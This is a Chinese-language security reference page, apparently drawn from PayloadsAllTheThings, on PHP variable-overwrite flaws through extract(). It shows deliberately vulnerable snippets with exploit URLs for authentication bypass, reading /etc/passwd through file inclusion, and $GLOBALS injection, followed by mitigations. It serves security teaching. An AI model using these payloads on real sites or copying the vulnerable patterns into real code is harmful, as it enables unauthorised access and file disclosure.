# External Variable Modification - 外部变量修改

[SEARCH_KEYWORDS]
漏洞类型: External Variable Modification 变量覆盖 Variable Overwrite PHP extract
攻击类型: Authentication Bypass Privilege Escalation File Inclusion RCE
关键词: extract import_request_variables GLOBALS variable pollution overwrite
技术: Variable Pollution File Inclusion Path Manipulation Global Override
函数: extract() import_request_variables() $GLOBALS
PHP版本: PHP 8.1.0后$GLOBALS写入不再支持

[CONTENT]

## 外部变量修改概述

外部变量修改漏洞发生在Web应用程序不当处理用户输入时，允许攻击者覆盖内部变量。PHP中的`extract($_GET)`、`extract($_POST)`或`import_request_variables()`函数如果在没有适当验证的情况下将用户控制的数据导入全局作用域，可能被滥用。

## 漏洞原理

`extract()`函数将数组中的变量导入当前符号表：
- 默认使用`EXTR_OVERWRITE`，**覆盖现有变量**
- 可能导致**变量污染**，影响安全机制
- 可作为**gadget**触发其他漏洞(RCE, LFI)

## 攻击技术

### 覆盖关键变量

```php
<?php
    $authenticated = false;
    extract($_GET);
    if ($authenticated) {
        echo "Access granted!";
    } else {
        echo "Access denied!";
    }
?>
```

**利用**：

```ps1
http://example.com/vuln.php?authenticated=true
http://example.com/vuln.php?authenticated=1
```

### 毒化文件包含

```php
<?php
    $page = "config.php";
    extract($_GET);
    include "$page";
?>
```

**利用**：

```ps1
http://example.com/vuln.php?page=../../etc/passwd
```

### 全局变量注入

:warning: PHP 8.1.0后，对整个`$GLOBALS`数组的写入访问不再支持。

```php
extract($_GET);
```

**利用**：

```ps1
http://example.com/vuln.php?GLOBALS[admin]=1
```

## 防护措施

使用`EXTR_SKIP`防止覆盖：

```php
extract($_GET, EXTR_SKIP);
```

其他防护：
- 避免使用`extract()`处理用户输入
- 使用白名单验证变量名
- 初始化所有关键变量

## 参考文档

原始来源: PayloadsAllTheThings/External Variable Modification/README.md